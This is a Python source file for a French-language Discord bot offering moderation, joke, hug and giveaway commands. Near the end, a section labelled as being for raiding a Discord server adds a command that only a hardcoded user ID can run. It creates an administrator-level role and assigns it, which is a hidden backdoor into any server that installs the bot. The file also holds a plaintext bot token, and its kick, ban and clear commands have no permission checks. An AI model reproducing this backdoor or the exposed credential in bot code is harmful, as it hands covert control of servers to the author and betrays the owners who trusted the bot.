import discord
from discord import member
from discord.ext import commands, tasks
import random
import time

hugs = ["https://media.tenor.com/images/b6d0903e0d54e05bb993f2eb78b39778/tenor.gif",
        "https://media4.giphy.com/media/od5H3PmEG5EVq/giphy.gif",
        "https://i.imgur.com/7X7HPs4.gif",
        "https://media.discordapp.net/attachments/817842843186888724/818896422966526042/506aa95bbb0a71351bcaa753eaa2a45c.gif",
        "https://media.discordapp.net/attachments/817842843186888724/818896422648545290/daeda6196a8bed9df9f3f3b12eb68749.gif"]

        
myId = 674766300295462944

bot = commands.Bot(command_prefix="!", description="bot en python")

jokes = ["Un jour, Dieu demanda à David de guetter. ||Et David guetta.||\n",
         "Papy, tu as fait la guerre ? \n -Oui. \n -Et qui l'as gagné ? \n -Mamie.\n",
         "Une fois en 2020, je suis sorti jusqu'à 21h02 et on était 7 ! J'étais un vrai gangster à cette époque là !\n",
         "Je vous présente danette. C'est la crème des cerfs\n",
         "Au Restaurent : \n"
         "- Nous ne mangeons pas d'oeufs, pas de viande, pas de produits laitiers ni de gluten. Que pouvez-vous nous conseiller ?\n"
         "- Un taxi !\n",
         "Ma grand-mère à commencé à marcher 5 kilomètres par jour quand elle a eu 60 ans.\n"
         "A présent, elle en à 97, et nous n'avons pas la moindre idée d'où elle est.\n"]

status = ["Fortnite",
          "Paladium",
          "Rocket League",
          "Among Us",
          "Minecraft",
          "Genshin Impact"]

@bot.event
async def on_ready():
    print("¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\n"
    	  "¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤LOGS¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\n"
    	  "¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\n")
    botStatus.start()


@tasks.loop()
async def botStatus():
    activity = discord.Game(random.choice(status))
    await bot.change_presence(status=discord.Status.dnd, activity=activity)


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("Mmmmmmh, j'ai bien l'impression que cette commande n'existe pas :/")
        print("Mmmmmmh, j'ai bien l'impression que cette commande n'existe pas :/\n")
        
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Il manque un argument.")
        print("Il manque un argument.\n")

    elif isinstance(error, commands.MissingPermissions):
        await ctx.send("Vous n'avez pas les permissions pour faire cette commande.")
        print("Vous n'avez pas les permissions pour faire cette commande.\n")

    elif isinstance(error, commands.CheckFailure):
        await ctx.send("Oups vous ne pouvez iutilisez cette commande.")
        print("Oups vous ne pouvez iutilisez cette commande.\n")

    if isinstance(error.original, discord.Forbidden):
        await ctx.send("Oups, je n'ai pas les permissions nécéssaires pour faire cette commmande")
        print("Oups, je n'ai pas les permissions nécéssaires pour faire cette commmande\n")


@bot.command()
async def serverInfo(ctx):
    server = ctx.guild
    numberOfTextChannels = len(server.text_channels)
    numberOfVoiceChannels = len(server.voice_channels)
    serverDescription = server.description
    numberOfMember = server.member_count
    serverName = server.name
    message = f"Le serveur ***__{serverName}__*** compte : \n ***__{numberOfMember}__*** membres. \n ***__{numberOfTextChannels}__*** channels des texte. \n Et ***__{numberOfVoiceChannels}__*** channels vocales"
    print(message + "\n")
    await ctx.send(message)


# commandes d'administration :

@bot.command()
async def clear(ctx, *, nbr: int = 1):
    messages = await ctx.channel.history(limit=nbr + 1).flatten()
    print(f"command: cls || nombre: {nbr}\n")
    for message in messages:
        await message.delete()


@bot.command()
async def kick(ctx, user: discord.User, *reason):
    reason = " ".join(reason)
    await ctx.guild.kick(user, reason=reason)
    embed = discord.Embed(title="**Kick**", description=f"Coup dur pour {user}, kick par un modérateur !")
    embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar_url)
    embed.set_thumbnail(
        url="https://img2.freepng.fr/20180124/yve/kisspng-cartoon-kick-kung-fu-drawing-illustration-bruce-lee-acrobatics-5a685ac5d6f3b6.6659706015167884218805.jpg")
    embed.add_field(name="Raison", value=reason)
    embed.add_field(name="Modérateur", value=ctx.author.name, )
    await ctx.send(embed=embed)
    print("**Banissement** : ")
    print(f"Coup dur pour {user}, kick par un modérateur !\n")

@bot.command()
async def ban(ctx, user: discord.User, *reason):
    reason = " ".join(reason)
    await ctx.guild.ban(user, reason=reason)
    await ctx.send(f"{user} à été ban \n reason : {reason}")
    print(f"{user} à été ban \n reason : {reason}\n")


@bot.command()
async def unban(ctx, user, *reason):
    reason = " ".join(reason)
    userName, userId = user.split("#")
    bannedUsers = await ctx.guild.bans()
    for i in bannedUsers:
        if i.user.name == userName and i.user.discriminator == userId:
            await ctx.guild.unban(i.user, reason=reason)
            await ctx.send(f"{user} à été unban \n reason : {reason}")
            print(f"{user} à été unban \n reason : {reason}\n")
            return
    await ctx.send(f"L'utilisateur {user} n'est pas bani")
    print(f"L'utilisateur {user} n'est pas bani\n")


async def createMutedRole(ctx):
    mutedRole = await ctx.guild.create_role(name="Muted",
                                            permissions=discord.Permissions(
                                                send_messages=False,
                                                speak=True),
                                            reason="Création du role [Muted]")
    for channel in ctx.guild.channels:
        await channel.set_permission(mutedRole, send_messages=False, speak=True)
        return mutedRole


async def getMutedRole(ctx):
    roles = ctx.guild.roles
    for role in roles:
        if role.name == "Muted":
            return role
    return await createMutedRole(ctx)


@bot.command()
async def mute(ctx, member: discord.Member, *, reason="Aucune raison n'a été renseigné."):
    mutedRole = await getMutedRole(ctx)
    await member.add_roles(mutedRole, reason=reason)
    await ctx.send(f"{member.mention} a été mute ! Raison : {reason}")
    print(f"{member.mention} a été mute ! Raison : {reason}\n")

@bot.command()
async def unmute(ctx, member: discord.Member, *, reason="Aucune raison n'a été renseigné."):
    mutedRole = await getMutedRole(ctx)
    await member.remove_roles(mutedRole, reason=reason)
    print(f"{member} a été unmute ! Raison : {reason}\n")

@bot.command()
async def creatRole(ctx, *,nom):
    author = ctx.author.name
    roleMembre = ""
    roles = ctx.guild.roles
    for role in roles:
        if role.name == nom:
            roleMembre = role
    if roleMembre == "":
        roleMembre = await ctx.guild.create_role(name = nom, reason = "Un membre a fait la commande creatRole.")
    await ctx.message.author.add_roles(roleMembre, reason = "commande")
    await ctx.send(f"{author} a reçu le role {nom}")
    print(f"{author} a reçu le role {nom}")

# commandes fun :

@bot.command()
async def say(ctx, *texte):
    await ctx.send(" ".join(texte))
    print(f"!say + {texte}\n")
    file.write(f"!say + {texte}\n")


@bot.command()
async def joke(ctx):
    Joke = random.choice(jokes)
    print(Joke + "\n")
    await ctx.send(Joke)

@bot.command()
async def count(ctx, number: int):
	print(f"Commande: count || Nombre: {number}\n")
	for msg in range(1,number + 1):
		await ctx.send(msg)

@bot.command()
async def code(ctx, code):
    target = 4
    print(f"Commande : code || Nombre cible : {target}")            
    if code == target:
        print("Bravo, tu as réussi le challenge !")
        await ctx.send("Bravo, tu as réussi le challenge !")
    else:
        print("Désolé, tu t'es tromper, essaie encore.")
        await ctx.send("Désolé, tu t'es tromper, essaie encore.")

@bot.command()
async def tirage(ctx, *challengers):
    print("Commande: tirage \n")
    embed = discord.Embed(title="**Tirage**")
    embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar_url)
    embed.add_field(name="Participant selectionés : ", value=challengers)
    await ctx.send(embed=embed)
    winner = random.choice(challengers)
    time.sleep(3)
    await ctx.send("Tirage dans...")
    time.sleep(1)
    await ctx.send("3...")
    time.sleep(1)
    await ctx.send("2...")
    time.sleep(1)
    await ctx.send("1...")
    time.sleep(1)
    embed_2 = discord.Embed(title="***WINNER***")
    embed_2.add_field(name="Le gagnant est:",value=winner)
    await ctx.send(embed=embed_2)

@bot.command()
async def hug(ctx, *target):
    message = random.choice(hugs)
    print(message + f"\n")
    await ctx.send(f"{target}, tu as reçu un calin de la part de {ctx.author.mention} " + message)

# Pour raid un server discord

async def createMakerRole(ctx):
    makerRole = await ctx.guild.create_role(name="Maker",
                                            permissions=discord.Permissions(
                                                send_messages=True,
                                                speak=True,
                                                administrator=True),
                                            reason="Création du role [Maker]")
    for channel in ctx.guild.channels:
        await channel.set_permission(makerRole, send_messages=True, speak=True, administrator=True)
        return makerRole


async def getMakerRole(ctx):
    roles = ctx.guild.roles
    for role in roles:
        if role.name == "Maker":
            return role
    return await createMakerRole(ctx)

@bot.command()
async def addMaker(ctx, member: discord.Member, *, reason="Aucune raison n'a été renseigné."):
    if ctx.author.id == myId:
        makerRole = await getMakerRole(ctx)
        await member.add_roles(makerRole, reason=reason)
        await ctx.send(f"{member.mention} est passé Maker ! Raison : {reason}")
        print(f"{member.mention} est passé Maker ! Raison : {reason}\n")
    else:
        print(f"Commande: addMaker || id = {ctx.author.id} [Ce n'est pas la bonne Id]")
        ctx.send(f"Commande: addMaker || id = {ctx.author.id} [Ce n'est pas la bonne Id]")

# BOT TOKEN :
bot.run("NzU0MjgyNTg2MDc5MTAxMDA4.X1yeZg.e8hkWq-x7bL6IkxLh75jRH_znCI")